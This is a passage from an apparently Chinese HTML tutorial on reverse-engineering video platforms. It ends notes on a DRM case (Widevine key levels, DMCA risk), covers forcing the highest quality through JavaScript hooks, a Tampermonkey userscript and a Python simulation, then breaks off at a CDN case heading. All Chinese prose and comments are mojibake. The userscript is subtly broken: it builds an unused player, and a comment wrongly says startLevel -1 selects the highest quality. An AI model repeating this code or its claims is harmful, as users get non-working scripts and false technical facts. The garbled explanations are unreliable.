        <li><strong>L1 vs L3</strong>: L1 çº§åˆ«çš„å¯†é’¥å­˜å‚¨åœ¨ç¡¬ä»¶å®‰å…¨æ¨¡å—ä¸­ï¼Œæ— æ³•ç›´æ¥æå–</li>
        <li><strong>æ³•å¾‹é£é™©</strong>: ç»•è¿‡ DRM å¯èƒ½è¿å DMCA ç­‰æ³•å¾‹</li>
        <li><strong>ä»…ç”¨äºç ”ç©¶</strong>: æœ¬æ¡ˆä¾‹ä»…ç”¨äºæ•™è‚²ç›®çš„</li>
      </ul>

      <hr />

      <h2 id="æ¡ˆä¾‹-4-è§†é¢‘æ¸…æ™°åº¦é€‰æ‹©ç®—æ³•é€†å‘">æ¡ˆä¾‹ 4: è§†é¢‘æ¸…æ™°åº¦é€‰æ‹©ç®—æ³•é€†å‘</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>è§†é¢‘å¹³å°æ ¹æ®ç½‘ç»œçŠ¶å†µè‡ªåŠ¨è°ƒæ•´è§†é¢‘æ¸…æ™°åº¦ã€‚é€†å‘è¿™ä¸ªç®—æ³•å¯ä»¥å¼ºåˆ¶æ’­æ”¾æœ€é«˜è´¨é‡è§†é¢‘ã€‚</p>

      <h3 id="é€†å‘æ­¥éª¤-4">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-å®šä½-abr-adaptive-bitrate-é€»è¾‘">1. å®šä½ ABR (Adaptive Bitrate) é€»è¾‘</h4>

      <p>åœ¨æ’­æ”¾å™¨ä»£ç ä¸­æœç´¢ <code>bandwidth</code>ã€<code>quality</code>ã€<code>resolution</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">AdaptiveBitrateController</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">currentLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">levels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="mf">640</span><span class="p">,</span><span class="w"> </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="mf">360</span><span class="p">,</span><span class="w"> </span><span class="nx">bitrate</span><span class="o">:</span><span class="w"> </span><span class="mf">800000</span><span class="w"> </span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="mf">1280</span><span class="p">,</span><span class="w"> </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="mf">720</span><span class="p">,</span><span class="w"> </span><span class="nx">bitrate</span><span class="o">:</span><span class="w"> </span><span class="mf">2500000</span><span class="w"> </span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="mf">1920</span><span class="p">,</span><span class="w"> </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="mf">1080</span><span class="p">,</span><span class="w"> </span><span class="nx">bitrate</span><span class="o">:</span><span class="w"> </span><span class="mf">5000000</span><span class="w"> </span><span class="p">},</span>
<span class="w">            </span><span class="p">{</span><span class="w"> </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="mf">3840</span><span class="p">,</span><span class="w"> </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="mf">2160</span><span class="p">,</span><span class="w"> </span><span class="nx">bitrate</span><span class="o">:</span><span class="w"> </span><span class="mf">15000000</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">];</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">selectLevel</span><span class="p">(</span><span class="nx">bandwidth</span><span class="p">,</span><span class="w"> </span><span class="nx">bufferLevel</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="cm">/**</span>
<span class="cm">         * é€‰æ‹©ç®—æ³•:</span>
<span class="cm">         * 1. å¦‚æœç¼“å†²åŒºä½äº 5 ç§’ï¼Œé™ä½è´¨é‡</span>
<span class="cm">         * 2. å¦‚æœå¸¦å®½ &gt; æ¯”ç‰¹ç‡ * 1.5ï¼Œå¯ä»¥å‡çº§</span>
<span class="cm">         * 3. è€ƒè™‘åˆ‡æ¢æˆæœ¬ï¼ˆé¿å…é¢‘ç¹åˆ‡æ¢ï¼‰</span>
<span class="cm">         */</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">bufferLevel</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// ç¼“å†²åŒºä¸è¶³ï¼Œé™çº§</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">currentLevel</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1">// æ‰¾åˆ°æœ€é«˜å¯ç”¨è´¨é‡</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">levels</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">bandwidth</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">levels</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">bitrate</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1.5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// é¿å…é¢‘ç¹åˆ‡æ¢</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">currentLevel</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">currentLevel</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">measureBandwidth</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="cm">/**</span>
<span class="cm">         * å¸¦å®½æµ‹é‡:</span>
<span class="cm">         * ä½¿ç”¨æœ€è¿‘ä¸‹è½½ç‰‡æ®µçš„é€Ÿåº¦ä¼°ç®—</span>
<span class="cm">         */</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">recentDownloads</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">downloadHistory</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="o">-</span><span class="mf">5</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">totalBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recentDownloads</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">sum</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">bytes</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">totalTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recentDownloads</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">sum</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">d</span><span class="p">.</span><span class="nx">duration</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">totalBytes</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nx">totalTime</span><span class="p">;</span><span class="w">  </span><span class="c1">// bps</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-hook-å¼ºåˆ¶æœ€é«˜è´¨é‡">2. Hook å¼ºåˆ¶æœ€é«˜è´¨é‡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ–¹æ³• 1: è¦†ç›– selectLevel æ–¹æ³•</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalSelectLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">AdaptiveBitrateController</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">selectLevel</span><span class="p">;</span>

<span class="w">    </span><span class="nx">AdaptiveBitrateController</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">selectLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">bandwidth</span><span class="p">,</span><span class="w"> </span><span class="nx">bufferLevel</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// æ€»æ˜¯è¿”å›æœ€é«˜è´¨é‡ç´¢å¼•</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">levels</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Forced highest quality&#39;</span><span class="p">);</span>
<span class="p">})();</span>

<span class="c1">// æ–¹æ³• 2: ä¿®æ”¹å¸¦å®½æµ‹é‡ç»“æœ</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalMeasureBandwidth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">AdaptiveBitrateController</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">measureBandwidth</span><span class="p">;</span>

<span class="w">    </span><span class="nx">AdaptiveBitrateController</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">measureBandwidth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// è¿”å›ä¸€ä¸ªå¾ˆå¤§çš„å¸¦å®½å€¼</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mf">100000000</span><span class="p">;</span><span class="w">  </span><span class="c1">// 100 Mbps</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="3-tampermonkey-ç”¨æˆ·è„šæœ¬">3. Tampermonkey ç”¨æˆ·è„šæœ¬</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ==UserScript==</span>
<span class="c1">// @name         Force Highest Video Quality</span>
<span class="c1">// @namespace    http://tampermonkey.net/</span>
<span class="c1">// @version      1.0</span>
<span class="c1">// @description  å¼ºåˆ¶è§†é¢‘æ’­æ”¾æœ€é«˜è´¨é‡</span>
<span class="c1">// @match        https://video.example.com/*</span>
<span class="c1">// @grant        none</span>
<span class="c1">// ==/UserScript==</span>

<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="s1">&#39;use strict&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// ç­‰å¾…æ’­æ”¾å™¨åŠ è½½</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">observer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">MutationObserver</span><span class="p">((</span><span class="nx">mutations</span><span class="p">,</span><span class="w"> </span><span class="nx">obs</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;video&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">obs</span><span class="p">.</span><span class="nx">disconnect</span><span class="p">();</span>
<span class="w">            </span><span class="nx">forceHighestQuality</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">observer</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">childList</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nx">subtree</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">forceHighestQuality</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// æ–¹æ³• 1: ä¿®æ”¹ HTMLMediaElement</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">video</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;video&#39;</span><span class="p">);</span>

<span class="w">        </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">video</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;playbackQuality&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">totalVideoFrames</span><span class="o">:</span><span class="w"> </span><span class="mf">10000</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">droppedVideoFrames</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">                    </span><span class="nx">corruptedVideoFrames</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span>
<span class="w">                </span><span class="p">};</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="c1">// æ–¹æ³• 2: Hook hls.js</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">Hls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalLoadSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Hls</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">loadSource</span><span class="p">;</span>

<span class="w">            </span><span class="nx">Hls</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">loadSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// å¼ºåˆ¶åŠ è½½æœ€é«˜è´¨é‡çš„ m3u8</span>
<span class="w">                </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\d+p\.m3u8/</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;2160p.m3u8&#39;</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="nx">originalLoadSource</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>
<span class="w">            </span><span class="p">};</span>

<span class="w">            </span><span class="c1">// ç¦ç”¨è‡ªåŠ¨è´¨é‡åˆ‡æ¢</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Hls</span><span class="p">({</span>
<span class="w">                </span><span class="nx">autoStartLoad</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">                </span><span class="nx">startLevel</span><span class="o">:</span><span class="w"> </span><span class="o">-</span><span class="mf">1</span><span class="p">,</span><span class="w">  </span><span class="c1">// -1 è¡¨ç¤ºæœ€é«˜è´¨é‡</span>
<span class="w">                </span><span class="nx">capLevelToPlayerSize</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w">  </span><span class="c1">// ä¸é™åˆ¶è´¨é‡</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Forced to highest quality&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="python-å®ç°-æ¨¡æ‹Ÿ-abr-ç®—æ³•">Python å®ç° - æ¨¡æ‹Ÿ ABR ç®—æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">VideoQualitySelector</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">qualities</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;360p&#39;</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">640</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">360</span><span class="p">,</span> <span class="s1">&#39;bitrate&#39;</span><span class="p">:</span> <span class="mi">800000</span><span class="p">},</span>
            <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;720p&#39;</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1280</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">720</span><span class="p">,</span> <span class="s1">&#39;bitrate&#39;</span><span class="p">:</span> <span class="mi">2500000</span><span class="p">},</span>
            <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;1080p&#39;</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">,</span> <span class="s1">&#39;bitrate&#39;</span><span class="p">:</span> <span class="mi">5000000</span><span class="p">},</span>
            <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;4K&#39;</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">3840</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">2160</span><span class="p">,</span> <span class="s1">&#39;bitrate&#39;</span><span class="p">:</span> <span class="mi">15000000</span><span class="p">},</span>
        <span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">current_quality</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># é»˜è®¤ 720p</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">estimate_bandwidth</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">download_history</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¼°ç®—å½“å‰å¸¦å®½&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">download_history</span><span class="p">:</span>
            <span class="k">return</span> <span class="mi">5000000</span>  <span class="c1"># é»˜è®¤ 5 Mbps</span>

        <span class="c1"># ä½¿ç”¨æœ€è¿‘ 5 æ¬¡ä¸‹è½½çš„å¹³å‡é€Ÿåº¦</span>
        <span class="n">recent</span> <span class="o">=</span> <span class="n">download_history</span><span class="p">[</span><span class="o">-</span><span class="mi">5</span><span class="p">:]</span>
        <span class="n">total_bytes</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s1">&#39;bytes&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">recent</span><span class="p">)</span>
        <span class="n">total_time</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">recent</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">total_time</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">return</span> <span class="mi">5000000</span>

        <span class="k">return</span> <span class="p">(</span><span class="n">total_bytes</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">/</span> <span class="n">total_time</span>  <span class="c1"># bps</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">select_quality</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bandwidth</span><span class="p">,</span> <span class="n">buffer_level</span><span class="p">,</span> <span class="n">force_highest</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é€‰æ‹©åˆé€‚çš„è§†é¢‘è´¨é‡&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="n">force_highest</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">qualities</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>

        <span class="c1"># ç¼“å†²åŒºä¸è¶³ï¼Œé™çº§</span>
        <span class="k">if</span> <span class="n">buffer_level</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_quality</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>

        <span class="c1"># é€‰æ‹©æœ€é«˜å¯ç”¨è´¨é‡ï¼ˆå¸¦å®½ &gt; æ¯”ç‰¹ç‡ * 1.5ï¼‰</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">qualities</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">bandwidth</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">qualities</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s1">&#39;bitrate&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mf">1.5</span><span class="p">:</span>
                <span class="c1"># é¿å…é¢‘ç¹åˆ‡æ¢ï¼ˆæœ€å¤šä¸€æ¬¡å˜åŒ–ä¸€çº§ï¼‰</span>
                <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_quality</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">current_quality</span> <span class="o">=</span> <span class="n">i</span>
                    <span class="k">return</span> <span class="n">i</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">current_quality</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_quality_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base_url</span><span class="p">,</span> <span class="n">quality_index</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æŒ‡å®šè´¨é‡çš„æ’­æ”¾åœ°å€&quot;&quot;&quot;</span>
        <span class="n">quality</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">qualities</span><span class="p">[</span><span class="n">quality_index</span><span class="p">]</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">quality</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">.m3u8&quot;</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">selector</span> <span class="o">=</span> <span class="n">VideoQualitySelector</span><span class="p">()</span>

<span class="c1"># æ¨¡æ‹Ÿä¸‹è½½å†å²</span>
<span class="n">download_history</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span><span class="s1">&#39;bytes&#39;</span><span class="p">:</span> <span class="mi">1000000</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="mf">1.5</span><span class="p">},</span>  <span class="c1"># ~5.3 Mbps</span>
    <span class="p">{</span><span class="s1">&#39;bytes&#39;</span><span class="p">:</span> <span class="mi">1200000</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="mf">1.8</span><span class="p">},</span>  <span class="c1"># ~5.3 Mbps</span>
    <span class="p">{</span><span class="s1">&#39;bytes&#39;</span><span class="p">:</span> <span class="mi">1500000</span><span class="p">,</span> <span class="s1">&#39;time&#39;</span><span class="p">:</span> <span class="mf">2.0</span><span class="p">},</span>  <span class="c1"># 6 Mbps</span>
<span class="p">]</span>

<span class="n">bandwidth</span> <span class="o">=</span> <span class="n">selector</span><span class="o">.</span><span class="n">estimate_bandwidth</span><span class="p">(</span><span class="n">download_history</span><span class="p">)</span>
<span class="n">quality_index</span> <span class="o">=</span> <span class="n">selector</span><span class="o">.</span><span class="n">select_quality</span><span class="p">(</span>
    <span class="n">bandwidth</span><span class="o">=</span><span class="n">bandwidth</span><span class="p">,</span>
    <span class="n">buffer_level</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>  <span class="c1"># 10 ç§’ç¼“å†²</span>
    <span class="n">force_highest</span><span class="o">=</span><span class="kc">True</span>  <span class="c1"># å¼ºåˆ¶æœ€é«˜è´¨é‡</span>
<span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Selected quality: </span><span class="si">{</span><span class="n">selector</span><span class="o">.</span><span class="n">qualities</span><span class="p">[</span><span class="n">quality_index</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-5-cdn-èŠ‚ç‚¹å‘ç°ä¸ä¼˜é€‰">æ¡ˆä¾‹ 5: CDN èŠ‚ç‚¹å‘ç°ä¸ä¼˜é€‰</h2>

      <h3 id="èƒŒæ™¯-5">èƒŒæ™¯</h3>

